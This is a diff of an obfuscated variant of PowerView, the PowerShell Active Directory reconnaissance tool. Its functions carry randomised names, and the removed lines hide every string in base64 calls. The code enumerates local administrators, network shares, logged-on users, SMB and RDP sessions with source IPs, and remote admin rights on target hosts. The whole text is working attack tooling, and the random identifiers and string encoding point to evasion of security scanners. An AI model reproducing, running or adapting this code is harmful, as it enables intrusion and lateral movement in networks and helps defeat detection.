         [Parameter(ValueFromPipelineByPropertyName = $True)]
         [ValidateNotNullOrEmpty()]
         [String]
-        $GroupName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5pc3RyYXRvcnM="))),
+        $GroupName = 'Administrators',
 
         [ValidateSet('API', 'WinNT')]
         [Alias('CollectionMethod')]
         [String]
-        $Method = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QVBJ"))),
+        $Method = 'API',
 
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
@@ -8720,14 +8724,14 @@ function gmmjsn {
     )
 
     BEGIN {
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
-            $LogonToken = jgnbzn -Credential $Credential
+        if ($PSBoundParameters['Credential']) {
+            $LogonToken = kckfvi -Credential $Credential
         }
     }
 
     PROCESS {
         ForEach ($Computer in $ComputerName) {
-            if ($Method -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QVBJ")))) {
+            if ($Method -eq 'API') {
                 
 
                 
@@ -8764,17 +8768,17 @@ function gmmjsn {
                         $Result2 = $Advapi32::ConvertSidToStringSid($Info.lgrmi2_sid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
 
                         if ($Result2 -eq 0) {
-                            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1OZXRMb2NhbEdyb3VwTWVtYmVyXSBFcnJvcjogezB9"))) -f $(([ComponentModel.Win32Exception] $LastError).Message))
+                            Write-Verbose ("[Get-NetLocalGroupMember] Error: {0}" -f $(([ComponentModel.Win32Exception] $LastError).Message))
                         }
                         else {
                             $Member = New-Object PSObject
-                            $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
-                            $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBOYW1l"))) $GroupName
-                            $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyTmFtZQ=="))) $Info.lgrmi2_domainandname
-                            $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U0lE"))) $SidString
-                            $IsGroup = $($Info.lgrmi2_sidusage -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2lkVHlwZUdyb3Vw"))))
-                            $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNHcm91cA=="))) $IsGroup
-                            $Member.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkxvY2FsR3JvdXBNZW1iZXIuQVBJ"))))
+                            $Member | Add-Member Noteproperty 'ComputerName' $Computer
+                            $Member | Add-Member Noteproperty 'GroupName' $GroupName
+                            $Member | Add-Member Noteproperty 'MemberName' $Info.lgrmi2_domainandname
+                            $Member | Add-Member Noteproperty 'SID' $SidString
+                            $IsGroup = $($Info.lgrmi2_sidusage -eq 'SidTypeGroup')
+                            $Member | Add-Member Noteproperty 'IsGroup' $IsGroup
+                            $Member.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroupMember.API')
                             $Members += $Member
                         }
                     }
@@ -8783,65 +8787,65 @@ function gmmjsn {
                     $Null = $Netapi32::NetApiBufferFree($PtrInfo)
 
                     
-                    $MachineSid = $Members | Where-Object {$_.SID -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LiotNTAw"))) -or ($_.SID -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LiotNTAx"))))} | Select-Object -Expand SID
+                    $MachineSid = $Members | Where-Object {$_.SID -match '.*-500' -or ($_.SID -match '.*-501')} | Select-Object -Expand SID
                     if ($MachineSid) {
-                        $MachineSid = $MachineSid.Substring(0, $MachineSid.LastIndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LQ==")))))
+                        $MachineSid = $MachineSid.Substring(0, $MachineSid.LastIndexOf('-'))
 
                         $Members | ForEach-Object {
                             if ($_.SID -match $MachineSid) {
-                                $_ | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNEb21haW4="))) $False
+                                $_ | Add-Member Noteproperty 'IsDomain' $False
                             }
                             else {
-                                $_ | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNEb21haW4="))) $True
+                                $_ | Add-Member Noteproperty 'IsDomain' $True
                             }
                         }
                     }
                     else {
                         $Members | ForEach-Object {
-                            if ($_.SID -notmatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMjE=")))) {
-                                $_ | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNEb21haW4="))) $False
+                            if ($_.SID -notmatch 'S-1-5-21') {
+                                $_ | Add-Member Noteproperty 'IsDomain' $False
                             }
                             else {
-                                $_ | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNEb21haW4="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VU5LTk9XTg==")))
+                                $_ | Add-Member Noteproperty 'IsDomain' 'UNKNOWN'
                             }
                         }
                     }
                     $Members
                 }
                 else {
-                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1OZXRMb2NhbEdyb3VwTWVtYmVyXSBFcnJvcjogezB9"))) -f $(([ComponentModel.Win32Exception] $Result).Message))
+                    Write-Verbose ("[Get-NetLocalGroupMember] Error: {0}" -f $(([ComponentModel.Win32Exception] $Result).Message))
                 }
             }
             else {
                 
                 try {
-                    $GroupProvider = [ADSI]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luTlQ6Ly8kQ29tcHV0ZXIvJEdyb3VwTmFtZSxncm91cA==")))
+                    $GroupProvider = [ADSI]"WinNT://$Computer/$GroupName,group"
 
-                    $GroupProvider.psbase.Invoke(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVycw==")))) | ForEach-Object {
+                    $GroupProvider.psbase.Invoke('Members') | ForEach-Object {
 
                         $Member = New-Object PSObject
-                        $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
-                        $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBOYW1l"))) $GroupName
+                        $Member | Add-Member Noteproperty 'ComputerName' $Computer
+                        $Member | Add-Member Noteproperty 'GroupName' $GroupName
 
                         $LocalUser = ([ADSI]$_)
-                        $AdsPath = $LocalUser.InvokeGet(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRzUGF0aA==")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luTlQ6Ly8="))), '')
-                        $IsGroup = ($LocalUser.SchemaClassName -like ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Z3JvdXA="))))
+                        $AdsPath = $LocalUser.InvokeGet('AdsPath').Replace('WinNT://', '')
+                        $IsGroup = ($LocalUser.SchemaClassName -like 'group')
 
-                        if(([regex]::Matches($AdsPath, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw=="))))).count -eq 1) {
+                        if(([regex]::Matches($AdsPath, '/')).count -eq 1) {
                             
                             $MemberIsDomain = $True
-                            $Name = $AdsPath.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))
+                            $Name = $AdsPath.Replace('/', '\')
                         }
                         else {
                             
                             $MemberIsDomain = $False
-                            $Name = $AdsPath.Substring($AdsPath.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw=="))))+1).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))
+                            $Name = $AdsPath.Substring($AdsPath.IndexOf('/')+1).Replace('/', '\')
                         }
 
-                        $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWNjb3VudE5hbWU="))) $Name
-                        $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U0lE"))) ((New-Object System.Security.Principal.SecurityIdentifier($LocalUser.InvokeGet(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0U0lE")))),0)).Value)
-                        $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNHcm91cA=="))) $IsGroup
-                        $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNEb21haW4="))) $MemberIsDomain
+                        $Member | Add-Member Noteproperty 'AccountName' $Name
+                        $Member | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalUser.InvokeGet('ObjectSID'),0)).Value)
+                        $Member | Add-Member Noteproperty 'IsGroup' $IsGroup
+                        $Member | Add-Member Noteproperty 'IsDomain' $MemberIsDomain
 
                         
                         
@@ -8895,7 +8899,7 @@ function gmmjsn {
                     }
                 }
                 catch {
-                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1OZXRMb2NhbEdyb3VwTWVtYmVyXSBFcnJvciBmb3IgJENvbXB1dGVyIDogezB9"))) -f $_)
+                    Write-Verbose ("[Get-NetLocalGroupMember] Error for $Computer : {0}" -f $_)
                 }
             }
         }
@@ -8903,13 +8907,13 @@ function gmmjsn {
     
     END {
         if ($LogonToken) {
-            husafk -TokenHandle $LogonToken
+            njmybn -TokenHandle $LogonToken
         }
     }
 }
 
 
-function dmgpvz {
+function otbyom {
 
 
     [OutputType('PowerView.ShareInfo')]
@@ -8919,7 +8923,7 @@ function dmgpvz {
         [Alias('HostName', 'dnshostname', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0"))),
+        $ComputerName = 'localhost',
 
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
@@ -8927,8 +8931,8 @@ function dmgpvz {
     )
 
     BEGIN {
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
-            $LogonToken = jgnbzn -Credential $Credential
+        if ($PSBoundParameters['Credential']) {
+            $LogonToken = kckfvi -Credential $Credential
         }
     }
 
@@ -8961,8 +8965,8 @@ function dmgpvz {
 
                     
                     $Share = $Info | Select-Object *
-                    $Share | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
-                    $Share.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlNoYXJlSW5mbw=="))))
+                    $Share | Add-Member Noteproperty 'ComputerName' $Computer
+                    $Share.PSObject.TypeNames.Insert(0, 'PowerView.ShareInfo')
                     $Offset = $NewIntPtr.ToInt64()
                     $Offset += $Increment
                     $Share
@@ -8972,20 +8976,20 @@ function dmgpvz {
                 $Null = $Netapi32::NetApiBufferFree($PtrInfo)
             }
             else {
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1OZXRTaGFyZV0gRXJyb3I6IHswfQ=="))) -f $(([ComponentModel.Win32Exception] $Result).Message))
+                Write-Verbose ("[Get-NetShare] Error: {0}" -f $(([ComponentModel.Win32Exception] $Result).Message))
             }
         }
     }
 
     END {
         if ($LogonToken) {
-            husafk -TokenHandle $LogonToken
+            njmybn -TokenHandle $LogonToken
         }
     }
 }
 
 
-function imvodn {
+function falrkd {
 
 
     [OutputType('PowerView.LoggedOnUserInfo')]
@@ -8995,7 +8999,7 @@ function imvodn {
         [Alias('HostName', 'dnshostname', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0"))),
+        $ComputerName = 'localhost',
 
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
@@ -9003,8 +9007,8 @@ function imvodn {
     )
 
     BEGIN {
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
-            $LogonToken = jgnbzn -Credential $Credential
+        if ($PSBoundParameters['Credential']) {
+            $LogonToken = kckfvi -Credential $Credential
         }
     }
 
@@ -9037,8 +9041,8 @@ function imvodn {
 
                     
                     $LoggedOn = $Info | Select-Object *
-                    $LoggedOn | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
-                    $LoggedOn.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkxvZ2dlZE9uVXNlckluZm8="))))
+                    $LoggedOn | Add-Member Noteproperty 'ComputerName' $Computer
+                    $LoggedOn.PSObject.TypeNames.Insert(0, 'PowerView.LoggedOnUserInfo')
                     $Offset = $NewIntPtr.ToInt64()
                     $Offset += $Increment
                     $LoggedOn
@@ -9048,20 +9052,20 @@ function imvodn {
                 $Null = $Netapi32::NetApiBufferFree($PtrInfo)
             }
             else {
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1OZXRMb2dnZWRvbl0gRXJyb3I6IHswfQ=="))) -f $(([ComponentModel.Win32Exception] $Result).Message))
+                Write-Verbose ("[Get-NetLoggedon] Error: {0}" -f $(([ComponentModel.Win32Exception] $Result).Message))
             }
         }
     }
 
     END {
         if ($LogonToken) {
-            husafk -TokenHandle $LogonToken
+            njmybn -TokenHandle $LogonToken
         }
     }
 }
 
 
-function sgkkys {
+function vfgybe {
 
 
     [OutputType('PowerView.SessionInfo')]
@@ -9071,7 +9075,7 @@ function sgkkys {
         [Alias('HostName', 'dnshostname', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0"))),
+        $ComputerName = 'localhost',
 
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
@@ -9079,8 +9083,8 @@ function sgkkys {
     )
 
     BEGIN {
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
-            $LogonToken = jgnbzn -Credential $Credential
+        if ($PSBoundParameters['Credential']) {
+            $LogonToken = kckfvi -Credential $Credential
         }
     }
 
@@ -9113,8 +9117,8 @@ function sgkkys {
 
                     
                     $Session = $Info | Select-Object *
-                    $Session | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
-                    $Session.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlNlc3Npb25JbmZv"))))
+                    $Session | Add-Member Noteproperty 'ComputerName' $Computer
+                    $Session.PSObject.TypeNames.Insert(0, 'PowerView.SessionInfo')
                     $Offset = $NewIntPtr.ToInt64()
                     $Offset += $Increment
                     $Session
@@ -9124,7 +9128,7 @@ function sgkkys {
                 $Null = $Netapi32::NetApiBufferFree($PtrInfo)
             }
             else {
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1OZXRTZXNzaW9uXSBFcnJvcjogezB9"))) -f $(([ComponentModel.Win32Exception] $Result).Message))
+                Write-Verbose ("[Get-NetSession] Error: {0}" -f $(([ComponentModel.Win32Exception] $Result).Message))
             }
         }
     }
@@ -9132,13 +9136,13 @@ function sgkkys {
 
     END {
         if ($LogonToken) {
-            husafk -TokenHandle $LogonToken
+            njmybn -TokenHandle $LogonToken
         }
     }
 }
 
 
-function ylqdfd {
+function hikyef {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -9149,12 +9153,12 @@ function ylqdfd {
         [Alias('HostName', 'dnshostname', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0")))
+        $ComputerName = 'localhost'
     )
 
     BEGIN {
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
-            $LogonToken = jgnbzn -Credential $Credential
+        if ($PSBoundParameters['Credential']) {
+            $LogonToken = kckfvi -Credential $Credential
         }
     }
 
@@ -9162,14 +9166,14 @@ function ylqdfd {
         ForEach ($Computer in $ComputerName) {
             try {
                 
-                $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcnM="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JENvbXB1dGVyTmFtZQ=="))))
+                $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', "$ComputerName")
 
                 
-                $Reg.GetSubKeyNames() | Where-Object { $_ -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMjEtWzAtOV0rLVswLTldKy1bMC05XSstWzAtOV0rJA=="))) } | ForEach-Object {
-                    $UserName = ylepkl -ObjectSID $_ -OutputType ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluU2ltcGxl")))
+                $Reg.GetSubKeyNames() | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' } | ForEach-Object {
+                    $UserName = rnmqfb -ObjectSID $_ -OutputType 'DomainSimple'
 
                     if ($UserName) {
-                        $UserName, $UserDomain = $UserName.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QA=="))))
+                        $UserName, $UserDomain = $UserName.Split('@')
                     }
                     else {
                         $UserName = $_
@@ -9177,29 +9181,29 @@ function ylqdfd {
                     }
 
                     $RegLoggedOnUser = New-Object PSObject
-                    $RegLoggedOnUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JENvbXB1dGVyTmFtZQ==")))
-                    $RegLoggedOnUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckRvbWFpbg=="))) $UserDomain
-                    $RegLoggedOnUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlck5hbWU="))) $UserName
-                    $RegLoggedOnUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlclNJRA=="))) $_
-                    $RegLoggedOnUser.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlJlZ0xvZ2dlZE9uVXNlcg=="))))
+                    $RegLoggedOnUser | Add-Member Noteproperty 'ComputerName' "$ComputerName"
+                    $RegLoggedOnUser | Add-Member Noteproperty 'UserDomain' $UserDomain
+                    $RegLoggedOnUser | Add-Member Noteproperty 'UserName' $UserName
+                    $RegLoggedOnUser | Add-Member Noteproperty 'UserSID' $_
+                    $RegLoggedOnUser.PSObject.TypeNames.Insert(0, 'PowerView.RegLoggedOnUser')
                     $RegLoggedOnUser
                 }
             }
             catch {
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1SZWdMb2dnZWRPbl0gRXJyb3Igb3BlbmluZyByZW1vdGUgcmVnaXN0cnkgb24gJyRDb21wdXRlck5hbWUnIDogezB9"))) -f $_)
+                Write-Verbose ("[Get-RegLoggedOn] Error opening remote registry on '$ComputerName' : {0}" -f $_)
             }
         }
     }
 
     END {
         if ($LogonToken) {
-            husafk -TokenHandle $LogonToken
+            njmybn -TokenHandle $LogonToken
         }
     }
 }
 
 
-function kgypsy {
+function pnvery {
 
 
     [OutputType('PowerView.RDPSessionInfo')]
@@ -9209,7 +9213,7 @@ function kgypsy {
         [Alias('HostName', 'dnshostname', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0"))),
+        $ComputerName = 'localhost',
 
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
@@ -9217,8 +9221,8 @@ function kgypsy {
     )
 
     BEGIN {
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
-            $LogonToken = jgnbzn -Credential $Credential
+        if ($PSBoundParameters['Credential']) {
+            $LogonToken = kckfvi -Credential $Credential
         }
     }
 
@@ -9256,25 +9260,25 @@ function kgypsy {
                         $RDPSession = New-Object PSObject
 
                         if ($Info.pHostName) {
-                            $RDPSession | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Info.pHostName
+                            $RDPSession | Add-Member Noteproperty 'ComputerName' $Info.pHostName
                         }
                         else {
                             
-                            $RDPSession | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
+                            $RDPSession | Add-Member Noteproperty 'ComputerName' $Computer
                         }
 
-                        $RDPSession | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2Vzc2lvbk5hbWU="))) $Info.pSessionName
+                        $RDPSession | Add-Member Noteproperty 'SessionName' $Info.pSessionName
 
                         if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {
                             
-                            $RDPSession | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlck5hbWU="))) (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezB9"))) -f $($Info.pUserName))
+                            $RDPSession | Add-Member Noteproperty 'UserName' ("{0}" -f $($Info.pUserName))
                         }
                         else {
-                            $RDPSession | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlck5hbWU="))) (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezB9XHsxfQ=="))) -f $($Info.pDomainName), $($Info.pUserName))
+                            $RDPSession | Add-Member Noteproperty 'UserName' ("{0}\{1}" -f $($Info.pDomainName), $($Info.pUserName))
                         }
 
-                        $RDPSession | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SUQ="))) $Info.SessionID
-                        $RDPSession | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RhdGU="))) $Info.State
+                        $RDPSession | Add-Member Noteproperty 'ID' $Info.SessionID
+                        $RDPSession | Add-Member Noteproperty 'State' $Info.State
 
                         $ppBuffer = [IntPtr]::Zero
                         $pBytesReturned = 0
@@ -9284,7 +9288,7 @@ function kgypsy {
                         $Result2 = $Wtsapi32::WTSQuerySessionInformation($Handle, $Info.SessionID, 14, [ref]$ppBuffer, [ref]$pBytesReturned);$LastError2 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
 
                         if ($Result2 -eq 0) {
-                            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1OZXRSRFBTZXNzaW9uXSBFcnJvcjogezB9"))) -f $(([ComponentModel.Win32Exception] $LastError2).Message))
+                            Write-Verbose ("[Get-NetRDPSession] Error: {0}" -f $(([ComponentModel.Win32Exception] $LastError2).Message))
                         }
                         else {
                             $Offset2 = $ppBuffer.ToInt64()
@@ -9293,14 +9297,14 @@ function kgypsy {
 
                             $SourceIP = $Info2.Address
                             if ($SourceIP[2] -ne 0) {
-                                $SourceIP = [String]$SourceIP[2]+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))+[String]$SourceIP[3]+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))+[String]$SourceIP[4]+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))+[String]$SourceIP[5]
+                                $SourceIP = [String]$SourceIP[2]+'.'+[String]$SourceIP[3]+'.'+[String]$SourceIP[4]+'.'+[String]$SourceIP[5]
                             }
                             else {
                                 $SourceIP = $Null
                             }
 
-                            $RDPSession | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U291cmNlSVA="))) $SourceIP
-                            $RDPSession.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlJEUFNlc3Npb25JbmZv"))))
+                            $RDPSession | Add-Member Noteproperty 'SourceIP' $SourceIP
+                            $RDPSession.PSObject.TypeNames.Insert(0, 'PowerView.RDPSessionInfo')
                             $RDPSession
 
                             
@@ -9313,26 +9317,26 @@ function kgypsy {
                     $Null = $Wtsapi32::WTSFreeMemoryEx(2, $ppSessionInfo, $pCount)
                 }
                 else {
-                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1OZXRSRFBTZXNzaW9uXSBFcnJvcjogezB9"))) -f $(([ComponentModel.Win32Exception] $LastError).Message))
+                    Write-Verbose ("[Get-NetRDPSession] Error: {0}" -f $(([ComponentModel.Win32Exception] $LastError).Message))
                 }
                 
                 $Null = $Wtsapi32::WTSCloseServer($Handle)
             }
             else {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1OZXRSRFBTZXNzaW9uXSBFcnJvciBvcGVuaW5nIHRoZSBSZW1vdGUgRGVza3RvcCBTZXNzaW9uIEhvc3QgKFJEIFNlc3Npb24gSG9zdCkgc2VydmVyIGZvcjogJENvbXB1dGVyTmFtZQ==")))
+                Write-Verbose "[Get-NetRDPSession] Error opening the Remote Desktop Session Host (RD Session Host) server for: $ComputerName"
             }
         }
     }
 
     END {
         if ($LogonToken) {
-            husafk -TokenHandle $LogonToken
+            njmybn -TokenHandle $LogonToken
         }
     }
 }
 
 
-function gsoflb {
+function asbepi {
 
 
     [OutputType('PowerView.AdminAccess')]
@@ -9342,7 +9346,7 @@ function gsoflb {
         [Alias('HostName', 'dnshostname', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0"))),
+        $ComputerName = 'localhost',
 
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
@@ -9350,8 +9354,8 @@ function gsoflb {
     )
 
     BEGIN {
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
-            $LogonToken = jgnbzn -Credential $Credential
+        if ($PSBoundParameters['Credential']) {
+            $LogonToken = kckfvi -Credential $Credential
         }
     }
 
@@ -9359,34 +9363,34 @@ function gsoflb {
         ForEach ($Computer in $ComputerName) {
             
             
-            $Handle = $Advapi32::OpenSCManagerW(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFwkQ29tcHV0ZXI="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZXNBY3RpdmU="))), 0xF003F);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+            $Handle = $Advapi32::OpenSCManagerW("\\$Computer", 'ServicesActive', 0xF003F);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
 
             $IsAdmin = New-Object PSObject
-            $IsAdmin | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
+            $IsAdmin | Add-Member Noteproperty 'ComputerName' $Computer
 
             
             if ($Handle -ne 0) {
                 $Null = $Advapi32::CloseServiceHandle($Handle)
-                $IsAdmin | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNBZG1pbg=="))) $True
+                $IsAdmin | Add-Member Noteproperty 'IsAdmin' $True
             }
             else {
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1Rlc3QtQWRtaW5BY2Nlc3NdIEVycm9yOiB7MH0="))) -f $(([ComponentModel.Win32Exception] $LastError).Message))
-                $IsAdmin | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNBZG1pbg=="))) $False
+                Write-Verbose ("[Test-AdminAccess] Error: {0}" -f $(([ComponentModel.Win32Exception] $LastError).Message))
+                $IsAdmin | Add-Member Noteproperty 'IsAdmin' $False
             }
